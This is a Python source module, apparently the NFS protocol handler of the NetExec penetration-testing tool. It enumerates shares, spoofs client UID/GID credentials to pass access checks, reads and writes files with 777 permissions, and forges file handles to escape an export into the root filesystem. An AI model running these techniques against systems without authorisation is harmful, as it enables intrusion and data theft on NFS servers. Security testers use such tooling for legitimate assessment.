from termcolor import colored
from nxc.connection import connection
from nxc.logger import NXCAdapter
from nxc.helpers.logger import highlight
from nxc.config import host_info_colors
from pyNfsClient import (
    Portmap,
    Mount,
    NFSv3,
)
from pyNfsClient.const import (
    NFS_PROGRAM,
    NFS_V3,
    ACCESS3_READ,
    ACCESS3_MODIFY,
    ACCESS3_EXECUTE,
    NFSSTAT3,
    NFS3ERR_NOENT,
    NF3REG,
)
import re
import uuid
import math
import os


class FileID:
    root = "root"
    ext = "ext/xfs"
    btrfs = "btrfs"
    udf = "udf"
    nilfs = "nilfs"
    fat = "fat"
    lustre = "lustre"
    kernfs = "kernfs"
    invalid = "invalid"
    unknown = "unknown"


# src: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
fileid_types = {
    0: FileID.root,
    1: FileID.ext,
    2: FileID.ext,
    0x81: FileID.ext,
    0x4d: FileID.btrfs,
    0x4e: FileID.btrfs,
    0x4f: FileID.btrfs,
    0x51: FileID.udf,
    0x52: FileID.udf,
    0x61: FileID.nilfs,
    0x62: FileID.nilfs,
    0x71: FileID.fat,
    0x72: FileID.fat,
    0x97: FileID.lustre,
    0xfe: FileID.kernfs,
    0xff: FileID.invalid
}

# src: https://elixir.bootlin.com/linux/v6.13.4/source/fs/nfsd/nfsfh.h#L17-L45
fsid_lens = {
    0: 8,
    1: 4,
    2: 12,
    3: 8,
    4: 8,
    5: 8,
    6: 16,
    7: 24,
}


class nfs(connection):
    def __init__(self, args, db, host):
        self.protocol = "nfs"
        self.port = 111
        self.portmap = None
        self.mnt_port = None
        self.mount = None
        self.auth = {
            "flavor": 1,
            "machine_name": uuid.uuid4().hex.upper()[0:6],
            "uid": 0,
            "gid": 0,
            "aux_gid": [],
        }
        self.root_escape = False
        # If root escape is possible, the escape_share and escape_fh will be populated
        self.escape_share = None
        self.escape_fh = b""
        connection.__init__(self, args, db, host)

    def proto_logger(self):
        self.logger = NXCAdapter(
            extra={
                "protocol": "NFS",
                "host": self.host,
                "port": self.port,
                "hostname": self.hostname,
            }
        )

    def create_conn_obj(self):
        """Initializes and connects to the portmap and mounted folder"""
        try:
            # Portmap Initialization
            self.portmap = Portmap(self.host, timeout=self.args.nfs_timeout)
            self.portmap.connect()

            # Mount Initialization
            self.mnt_port = self.portmap.getport(Mount.program, Mount.program_version)
            self.mount = Mount(host=self.host, port=self.mnt_port, timeout=self.args.nfs_timeout, auth=self.auth)
            self.mount.connect()

            # Change logging port to the NFS port
            self.port = self.mnt_port
            self.proto_logger()
        except Exception as e:
            self.logger.info(f"Error during Initialization: {e}")
            return False
        return True

    def enum_host_info(self):
        try:
            # Dump all registered programs
            programs = self.portmap.dump()

            self.nfs_versions = set()
            for program in programs:
                if program["program"] == NFS_PROGRAM:
                    self.nfs_versions.add(program["version"])
        except Exception as e:
            self.logger.debug(f"Error checking NFS version: {self.host} {e}")

        # Connect to NFS
        nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
        self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
        self.nfs3.connect()
        # Check if root escape is possible
        self.root_escape = self.try_root_escape()
        self.nfs3.disconnect()

    def print_host_info(self):
        root_escape_str = colored(f"root escape:{self.root_escape}", host_info_colors[1 if self.root_escape else 0], attrs=["bold"])
        self.logger.display(f"Supported NFS versions: ({', '.join(str(x) for x in self.nfs_versions)}) ({root_escape_str})")

    def disconnect(self):
        """Disconnect mount and portmap if they are connected"""
        try:
            self.mount.disconnect()
            self.portmap.disconnect()
            self.logger.info(f"Disconnect successful: {self.host}:{self.port}")
        except Exception as e:
            self.logger.fail(f"Error during disconnect: {e}")

    def list_dir(self, file_handle, path, recurse=1):
        """Process entries in NFS directory recursively with UID autodection"""
        def process_entries(entries, path, uid, recurse):
            try:
                contents = []
                for entry in entries:
                    if "name" in entry and entry["name"] not in [b".", b".."]:
                        item_path = f'{path}/{entry["name"].decode("utf-8")}'  # Constructing file path
                        if entry.get("name_attributes", {}).get("present", False):
                            if entry["name_attributes"]["attributes"]["type"] == 2 and recurse > 0:  # Recursive directory listing. Entry type shows file format. 1 is file, 2 is folder.
                                dir_handle = entry["name_handle"]["handle"]["data"]
                                contents += self.list_dir(dir_handle, item_path, recurse=recurse - 1)
                            else:
                                file_handle = entry["name_handle"]["handle"]["data"]
                                attrs = self.nfs3.getattr(file_handle, auth=self.auth)
                                file_size = attrs["attributes"]["size"]
                                file_size = convert_size(file_size)
                                uid = attrs["attributes"]["uid"]
                                read_perm, write_perm, exec_perm = self.get_permissions(entry["name_handle"]["handle"]["data"])
                                contents.append({"path": item_path, "read": read_perm, "write": write_perm, "execute": exec_perm, "filesize": file_size, "uid": uid})

                    if entry["nextentry"]:
                        # Processing next entries recursively
                        contents += process_entries(entry["nextentry"], path, uid, recurse)

                return contents
            except Exception as e:
                self.logger.debug(f"Error on Listing Entries for NFS Shares: {self.host}:{self.port} {e}")

        attrs = self.nfs3.getattr(file_handle, auth=self.auth)
        self.auth["uid"] = attrs["attributes"]["uid"]

        if recurse == 0:
            read_perm, write_perm, exec_perm = self.get_permissions(file_handle)
            return [{"path": f"{path}/", "read": read_perm, "write": write_perm, "execute": exec_perm, "filesize": "-", "uid": self.auth["uid"]}]

        items = self.nfs3.readdirplus(file_handle, auth=self.auth)
        if "resfail" in items:
            raise Exception("Insufficient Permissions")
        else:
            entries = items["resok"]["reply"]["entries"]

        return process_entries(entries, path, self.auth["uid"], recurse)

    def export_info(self, export_nodes):
        """Enumerates all NFS shares and their access range"""
        networks = []
        for node in export_nodes:

            # Collect the names of the groups associated with this export node
            group_names = self.group_names(node.ex_groups)
            networks.append(group_names)

            # If there are more export nodes, process them recursively. More than one share.
            if node.ex_next:
                networks.extend(self.export_info(node.ex_next))

        return networks

    def group_names(self, groups):
        """Enumerates all access range of the share(s)"""
        result = []
        for group in groups:
            result.append(group.gr_name.decode())

            # If there are more IP's, process them recursively.
            if group.gr_next:
                result.extend(self.group_names(group.gr_next))

        return result

    def shares(self):
        self.logger.display("Enumerating NFS Shares")
        try:
            # Connect to NFS
            nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
            self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
            self.nfs3.connect()

            output_export = str(self.mount.export())
            networks = self.export_info(self.mount.export())

            reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
            shares = list(reg.findall(output_export))

            # Mount shares and check permissions
            self.logger.highlight(f"{'UID':<11}{'Perms':<9}{'Storage Usage':<17}{'Share':<30} {'Access List':<15}")
            self.logger.highlight(f"{'---':<11}{'-----':<9}{'-------------':<17}{'-----':<30} {'-----------':<15}")
            for share, network in zip(shares, networks, strict=True):
                try:
                    mnt_info = self.mount.mnt(share, self.auth)
                    self.logger.debug(f"Mounted {share} - {mnt_info}")
                    if mnt_info["status"] != 0:
                        self.logger.debug(f"Error mounting share {share}: {NFSSTAT3[mnt_info['status']]}")
                        self.logger.highlight(f"{'-':<11}{'---':<9}{'---'}/{'---':<12} {share:<30} {', '.join(network) if network else 'No network':<15}")
                    else:
                        file_handle = mnt_info["mountinfo"]["fhandle"]

                        info = self.nfs3.fsstat(file_handle, self.auth)
                        free_space = info["resok"]["fbytes"]
                        total_space = info["resok"]["tbytes"]
                        used_space = total_space - free_space

                        # Autodetectting the uid needed for the share
                        attrs = self.nfs3.getattr(file_handle, auth=self.auth)
                        self.auth["uid"] = attrs["attributes"]["uid"]

                        read_perm, write_perm, exec_perm = self.get_permissions(file_handle)
                        self.mount.umnt(self.auth)
                        self.logger.highlight(f"{self.auth['uid']:<11}{'r' if read_perm else '-'}{'w' if write_perm else '-'}{('x' if exec_perm else '-'):<7}{convert_size(used_space) + '/' + convert_size(total_space):<16} {share:<30} {', '.join(network) if network else 'No network':<15}")
                except Exception as e:
                    self.logger.fail(f"Failed to list share: {share} - {e}")

        except Exception as e:
            self.logger.fail(f"Error on Enumeration NFS Shares: {self.host}:{self.port} {e}")
        finally:
            self.nfs3.disconnect()

    def get_permissions(self, file_handle):
        """Check permissions for the file handle"""
        try:
            read_perm = self.nfs3.access(file_handle, ACCESS3_READ, self.auth).get("resok", {}).get("access", 0) is ACCESS3_READ
        except Exception:
            read_perm = False
        try:
            write_perm = self.nfs3.access(file_handle, ACCESS3_MODIFY, self.auth).get("resok", {}).get("access", 0) is ACCESS3_MODIFY
        except Exception:
            write_perm = False
        try:
            exec_perm = self.nfs3.access(file_handle, ACCESS3_EXECUTE, self.auth).get("resok", {}).get("access", 0) is ACCESS3_EXECUTE
        except Exception:
            exec_perm = False
        return read_perm, write_perm, exec_perm

    def enum_shares(self):
        try:
            nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
            self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
            self.nfs3.connect()

            # Mounting NFS Shares
            output_export = str(self.mount.export())
            reg = re.compile(r"ex_dir=b'([^']*)'")
            shares = list(reg.findall(output_export))
            networks = self.export_info(self.mount.export())

            self.logger.display("Enumerating NFS Shares Directories")
            for share, network in zip(shares, networks, strict=True):
                try:
                    mount_info = self.mount.mnt(share, self.auth)
                    self.logger.debug(f"Mounted {share} - {mount_info}")
                    if mount_info["status"] != 0:
                        self.logger.fail(f"Error mounting share {share}: {NFSSTAT3[mount_info['status']]}")
                        continue

                    fhandle = mount_info["mountinfo"]["fhandle"]
                    contents = self.list_dir(fhandle, share, self.args.enum_shares)

                    self.logger.success(share)
                    if contents:
                        self.logger.highlight(f"{'UID':<11}{'Perms':<9}{'File Size':<15}{'File Path':<45} {'Access List':<15}")
                        self.logger.highlight(f"{'---':<11}{'-----':<9}{'---------':<15}{'---------':<45} {'-----------':<15}")
                    for content in contents:
                        self.logger.highlight(f"{content['uid']:<11}{'r' if content['read'] else '-'}{'w' if content['write'] else '-'}{'x' if content['execute'] else '-':<7}{content['filesize']:<14} {content['path']:<45} {', '.join(network) if network else 'No network':<15}")
                except Exception as e:
                    if "RPC_AUTH_ERROR: AUTH_REJECTEDCRED" in str(e):
                        self.logger.fail(f"{share} - RPC Access denied")
                    elif "RPC_AUTH_ERROR: AUTH_TOOWEAK" in str(e):
                        self.logger.fail(f"{share} - Kerberos authentication required")
                    elif "Insufficient Permissions" in str(e):
                        self.logger.fail(f"{share} - Insufficient Permissions for share listing")
                    else:
                        self.logger.exception(f"{share} - {e}")
        except Exception as e:
            self.logger.debug(f"Error on Listing NFS Shares Directories: {self.host}:{self.port} {e}")
            self.logger.debug("It is probably unknown format or can not access as anonymously.")
        finally:
            self.nfs3.disconnect()

    def get_file(self):
        """Downloads a file from the NFS share"""
        remote_file_path = self.args.get_file[0]
        remote_dir_path, file_name = os.path.split(remote_file_path)
        local_file_path = self.args.get_file[1]

        # Do a bit of smart handling for the local file path
        if local_file_path.endswith("/"):
            local_file_path += file_name

        self.logger.display(f"Downloading {remote_file_path} to {local_file_path}")
        try:
            # Connect to NFS
            nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
            self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
            self.nfs3.connect()

            # Mount the NFS share or get the root handle
            if self.root_escape and not self.args.share:
                mount_fh = self.escape_fh
            elif not self.args.share:
                self.logger.fail("No root escape possible, please specify a share")
                return
            else:
                mnt_info = self.mount.mnt(self.args.share, self.auth)
                if mnt_info["status"] != 0:
                    self.logger.fail(f"Error mounting share {self.args.share}: {NFSSTAT3[mnt_info['status']]}")
                    return
                mount_fh = mnt_info["mountinfo"]["fhandle"]

            # Iterate over the path until we hit the file
            curr_fh = mount_fh
            for sub_path in remote_file_path.lstrip("/").split("/"):
                # Update the UID for the next object and get the handle
                self.update_auth(mount_fh)
                res = self.nfs3.lookup(curr_fh, sub_path, auth=self.auth)

                # Check for a bad path
                if "resfail" in res and res["status"] == NFS3ERR_NOENT:
                    self.logger.fail(f"Unknown path: {remote_file_path!r}")
                    return

                curr_fh = res["resok"]["object"]["data"]
                # If response is file then break
                if res["resok"]["obj_attributes"]["attributes"]["type"] == NF3REG:
                    break

            # Update the UID and GID for the file
            self.update_auth(curr_fh)

            # Handle files over the default chunk size of 1024 * 1024
            offset = 0
            eof = False

            # Loop until we have read the entire file
            with open(local_file_path, "wb+") as local_file:
                while not eof:
                    file_data = self.nfs3.read(curr_fh, offset, auth=self.auth)

                    if "resfail" in file_data:
                        raise Exception("Insufficient Permissions")

                    else:
                        # Get the data and append it to the total file data
                        data = file_data["resok"]["data"]
                        eof = file_data["resok"]["eof"]

                        # Update the offset to read the next chunk
                        offset += len(data)
                        # Write the file data to the local file
                        local_file.write(data)

            self.logger.highlight(f"File successfully downloaded from {remote_file_path} to {local_file_path}")

            # Unmount the share
            self.mount.umnt(self.auth)
        except Exception as e:
            self.logger.fail(f'Error retrieving file "{file_name}" from "{remote_dir_path}": {e}')
            if os.path.exists(local_file_path) and os.path.getsize(local_file_path) == 0:
                os.remove(local_file_path)

    def put_file(self):
        """Uploads a file to the NFS share"""
        local_file_path = self.args.put_file[0]
        remote_file_path = self.args.put_file[1]
        remote_dir_path, file_name = os.path.split(remote_file_path)

        # Check if local file is exist
        if not os.path.isfile(local_file_path):
            self.logger.fail(f"{local_file_path} does not exist.")
            return

        self.logger.display(f"Uploading from {local_file_path} to {remote_file_path}")
        try:
            # Connect to NFS
            nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
            self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
            self.nfs3.connect()

            # Mount the NFS share or get the root handle
            if self.root_escape and not self.args.share:
                mount_fh = self.escape_fh
            elif not self.args.share:
                self.logger.fail("No root escape possible, please specify a share")
                return
            else:
                mnt_info = self.mount.mnt(self.args.share, self.auth)
                if mnt_info["status"] != 0:
                    self.logger.fail(f"Error mounting share {self.args.share}: {NFSSTAT3[mnt_info['status']]}")
                    return
                mount_fh = mnt_info["mountinfo"]["fhandle"]

            # Iterate over the path
            curr_fh = mount_fh
            # If target dir is "" or "/" without filter we would get one item with [""]
            for sub_path in list(filter(None, remote_dir_path.lstrip("/").split("/"))):
                self.update_auth(mount_fh)
                res = self.nfs3.lookup(curr_fh, sub_path, auth=self.auth)

                # If the path does not exist, create it
                if "resfail" in res and res["status"] == NFS3ERR_NOENT:
                    self.logger.display(f"Creating directory '/{sub_path}/'")
                    res = self.nfs3.mkdir(curr_fh, sub_path, 0o777, auth=self.auth)
                    if res["status"] != 0:
                        self.logger.fail(f"Error creating directory '/{sub_path}/': {NFSSTAT3[res['status']]}")
                        return
                    else:
                        curr_fh = res["resok"]["obj"]["handle"]["data"]
                        continue

                curr_fh = res["resok"]["object"]["data"]

            # Update the UID and GID from the directory
            self.update_auth(curr_fh)

            # Checking if file_name already exists on remote file path
            lookup_response = self.nfs3.lookup(curr_fh, file_name, auth=self.auth)

            # If success, file_name does not exist on remote machine. Else, trying to overwrite it.
            if lookup_response["resok"] is None:
                # Create file
                self.logger.display(f"Trying to create {remote_file_path}{file_name}")
                res = self.nfs3.create(curr_fh, file_name, create_mode=1, mode=0o777, auth=self.auth)
                if res["status"] != 0:
                    raise Exception(NFSSTAT3[res["status"]])
                else:
                    file_handle = res["resok"]["obj"]["handle"]["data"]
                    self.update_auth(file_handle)
                self.logger.success(f"{file_name} successfully created")
            else:
                # Asking the user if they want to overwrite the file
                ans = input(highlight(f"[!] {file_name} already exists on {remote_file_path}. Do you want to overwrite it? [Y/n] ", "red"))
                if ans.lower() in ["y", "yes", ""]:
                    self.logger.display(f"{file_name} already exists on {remote_file_path}. Trying to overwrite it...")
                    file_handle = lookup_response["resok"]["object"]["data"]

            # Update the UID and GID for the file
            self.update_auth(file_handle)

            try:
                with open(local_file_path, "rb") as file:
                    file_data = file.read().decode()

                # Write the data to the remote file
                self.logger.info(f"Trying to write data from {local_file_path} to {remote_file_path}")
                res = self.nfs3.write(file_handle, 0, len(file_data), file_data, 1, auth=self.auth)
                if res["status"] != 0:
                    self.logger.fail(f"Error writing to {remote_file_path}: {NFSSTAT3[res['status']]}")
                    return
                else:
                    self.logger.success(f"Data from {local_file_path} successfully written to {remote_file_path} with permissions 777")
            except Exception as e:
                self.logger.fail(f"Could not write to {local_file_path}: {e}")

            # Unmount the share
            self.mount.umnt(self.auth)
        except Exception as e:
            self.logger.fail(f"Error writing file to share {remote_file_path}: {e}")
        else:
            self.logger.highlight(f"File {local_file_path} successfully uploaded to {remote_file_path}")

    def get_root_handles(self, mount_fh):
        """
        Get possible root handles to escape to the root filesystem
        Sources: 
        https://elixir.bootlin.com/linux/v6.13.4/source/fs/nfsd/nfsfh.h#L47-L62
        https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
        https://github.com/hvs-consulting/nfs-security-tooling/blob/main/nfs_analyze/nfs_analyze.py

        Usually:
        - 1 byte: 0x01 fb_version
        - 1 byte: 0x00 fb_auth_type, can be 0x00 (no auth) and 0x01 (some md5 auth), but is hardcoded to 0x00 in the linux kernel
        - 1 byte: 0xXX fb_fsid_type -> determines the encoding (length) of the fsid, just must be preserved
        - 1 byte: 0xXX fb_fileid_type -> determines the filesystem type
        """
        # First enumerate the directory and try to find a file/dir that contains the fid_type (4th position: handle[3])
        # See: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
        dir_data = self.format_directory(self.nfs3.readdirplus(mount_fh, auth=self.auth))
        filesystem = FileID.unknown
        for entry in dir_data:
            # Check if "." is already the root directory
            if entry["name"] == b".":
                if entry["name_handle"]["handle"]["data"][0] in [b"\x02", b"\x80"]:
                    self.logger.debug("Exported share is already the root directory")
                    return [entry["name_handle"]["handle"]["data"]]
            elif entry["name"] == b"..":
                continue
            else:
                try:
                    fid_type = entry["name_handle"]["handle"]["data"][3]
                    if fid_type in fileid_types:
                        filesystem = fileid_types[fid_type]
                        self.logger.debug(f"Found filesystem type: {filesystem}")
                        break
                except Exception as e:
                    self.logger.debug(f"Error on getting filesystem type: {e}")
                    continue

        self.logger.debug(f"Filesystem type: {filesystem}")

        # Generate the root handle depending on the filesystem type and preserve the file_id (respect the length)
        fh_fsid_type = mount_fh[2]
        fh_fsid_len = fsid_lens[fh_fsid_type]
        root_handles = []

        # Generate possible root handles
        # General syntax: 4 byte header + fsid + fileid
        # Format for the file id see: https://elixir.bootlin.com/linux/v6.13.4/source/include/linux/exportfs.h#L25
        fh = bytearray(mount_fh)
        if filesystem in [FileID.ext, FileID.unknown]:
            root_handles.append(bytes(fh[:3] + b"\x02" + fh[4:4+fh_fsid_len] + b"\x02\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x02\x00\x00\x00"))  # noqa: E226
            root_handles.append(bytes(fh[:3] + b"\x02" + fh[4:4+fh_fsid_len] + b"\x80\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x80\x00\x00\x00"))  # noqa: E226
        if filesystem in [FileID.btrfs, FileID.unknown]:
            # Iterate over btrfs subvolumes, use 16 as default similar to the guys from nfs-security-tooling
            for i in range(16):
                subvolume = int.to_bytes(i) + b"\x01\x00\x00"
                root_handles.append(bytes(fh[:3] + b"\x4d" + fh[4:4+fh_fsid_len] + b"\x00\x01\x00\x00" + b"\x00\x00\x00\x00" + subvolume + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"))  # noqa: E226

        return root_handles

    def try_root_escape(self) -> bool:
        """
        With an established connection look for a share that can be escaped to the root filesystem.
        If successfull, self.escape_share and self.escape_fh will be populated.

        Returns
        -------
            bool: True if root escape was successful
        """
        if not self.nfs3:
            raise Exception("NFS connection is not established")

        output_export = str(self.mount.export())
        reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
        shares = list(reg.findall(output_export))

        self.logger.debug(f"Trying root escape on shares: {shares}")
        for share in shares:
            mount_info = self.mount.mnt(share, self.auth)
            if mount_info["status"] != 0:
                self.logger.debug(f"Root escape: can't list directory {share}: {NFSSTAT3[mount_info['status']]}")
                self.mount.umnt(self.auth)
                continue
            mount_fh = mount_info["mountinfo"]["fhandle"]
            try:
                possible_root_fhs = self.get_root_handles(mount_fh)
                for fh in possible_root_fhs:
                    if "resfail" not in self.nfs3.readdir(fh, auth=self.auth):
                        self.logger.info(f"Root escape successful on share '{share}' with handle: {fh.hex()}")
                        self.escape_share = share
                        self.escape_fh = fh
                        self.mount.umnt(self.auth)
                        return True
            except Exception as e:
                self.logger.debug(f"Error trying root escape on share '{share}': {e}")
            self.mount.umnt(self.auth)
        return False

    def ls(self):
        # Connect to NFS
        nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
        self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
        self.nfs3.connect()

        # Remove leading or trailing slashes
        self.args.ls = self.args.ls.lstrip("/").rstrip("/")

        # NORMAL LS CALL (without root escape)
        if self.args.share:
            mount_info = self.mount.mnt(self.args.share, self.auth)
            if mount_info["status"] != 0:
                self.logger.fail(f"Could not mount share {self.args.share}: {NFSSTAT3[mount_info['status']]}")
                return
            else:
                mount_fh = mount_info["mountinfo"]["fhandle"]
        elif self.root_escape:
            # Interestingly we don't actually have to mount the share if we already got the handle
            self.logger.success(f"Successful escape on share: {self.escape_share}")
            mount_fh = self.escape_fh
        else:
            self.logger.fail("No root escape possible, please specify a share")
            return

        # Update UID and GID for the share
        self.update_auth(mount_fh)

        # We got a path to look up
        curr_fh = mount_fh
        is_file = False     # If the last path is a file

        # If ls is "" or "/" without filter we would get one item with [""]
        for sub_path in list(filter(None, self.args.ls.split("/"))):
            res = self.nfs3.lookup(curr_fh, sub_path, auth=self.auth)

            if "resfail" in res and res["status"] == NFS3ERR_NOENT:
                self.logger.fail(f"Unknown path: {self.args.ls!r}")
                return
            # If file then break and only display file
            if res["resok"]["obj_attributes"]["attributes"]["type"] == NF3REG:
                is_file = True
                break
            curr_fh = res["resok"]["object"]["data"]

        # Update the UID and GID for the file/dir
        self.update_auth(curr_fh)

        dir_listing = self.nfs3.readdirplus(curr_fh, auth=self.auth)
        if dir_listing["status"] != 0:
            self.logger.fail(f"Error on listing directory: {NFSSTAT3[dir_listing['status']]}")
            return
        content = self.format_directory(dir_listing)

        # Sometimes the NFS Server does not return the attributes for the files
        # However, they can still be looked up individually is missing
        for item in content:
            if not item["name_attributes"]["present"]:
                try:
                    res = self.nfs3.lookup(curr_fh, item["name"].decode(), auth=self.auth)
                    item["name_attributes"]["attributes"] = res["resok"]["obj_attributes"]["attributes"]
                    item["name_attributes"]["present"] = True
                    item["name_handle"]["handle"] = res["resok"]["object"]
                    item["name_handle"]["present"] = True
                except Exception as e:
                    self.logger.debug(f"Error on getting attributes for {item['name'].decode()}: {e}")

        # If the requested path is a file, we filter out all other files
        path = f"{self.args.share if self.args.share else ''}/{self.args.ls}"
        if is_file:
            content = [x for x in content if x["name"].decode() == sub_path]
            path = path.rsplit("/", 1)[0]   # Remove the file from the path
        self.print_directory(content, path)

    def print_directory(self, content, path):
        """
        Highlight log the content of the directory provided by a READDIRPLUS call.
        Expects an FORMATED output of self.format_directory.
        """
        self.logger.highlight(f"{'UID':<11}{'Perms':<7}{'File Size':<14}{'File Path'}")
        self.logger.highlight(f"{'---':<11}{'-----':<7}{'---------':<14}{'---------'}")
        for item in content:
            if not item["name_attributes"]["present"] or not item["name_handle"]["present"]:
                uid = "-"
                perms = "----"
                file_size = "-"
            else:
                uid = item["name_attributes"]["attributes"]["uid"]
                is_dir = "d" if item["name_attributes"]["attributes"]["type"] == 2 else "-"
                read_perm, write_perm, exec_perm = self.get_permissions(item["name_handle"]["handle"]["data"])
                perms = f"{is_dir}{'r' if read_perm else '-'}{'w' if write_perm else '-'}{'x' if exec_perm else '-'}"
                file_size = convert_size(item["name_attributes"]["attributes"]["size"])
            self.logger.highlight(f"{uid:<11}{perms:<7}{file_size:<14}{path.rstrip('/') + '/' + item['name'].decode()}")

    def format_directory(self, raw_directory):
        """Convert the chained directory entries to a list of the entries"""
        if "resfail" in raw_directory:
            self.logger.debug("Insufficient Permissions, NFS returned 'resfail'")
            return {}
        items = []
        nextentry = raw_directory["resok"]["reply"]["entries"][0]
        while nextentry:
            entry = nextentry
            nextentry = entry["nextentry"][0] if entry["nextentry"] else None
            entry.pop("nextentry")
            items.append(entry)

        # Sort by name to be linux-like
        return sorted(items, key=lambda x: x["name"].decode())

    def update_auth(self, file_handle):
        """Update the UID and GID for the file handle"""
        attrs = self.nfs3.getattr(file_handle, auth=self.auth)
        self.logger.debug(f"Updating auth with UID: {attrs['attributes']['uid']} and GID: {attrs['attributes']['gid']}")
        self.auth["uid"] = attrs["attributes"]["uid"]
        self.auth["gid"] = attrs["attributes"]["gid"]


def convert_size(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = math.floor(math.log(size_bytes, 1024))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 1)
    return f"{s}{size_name[i]}"
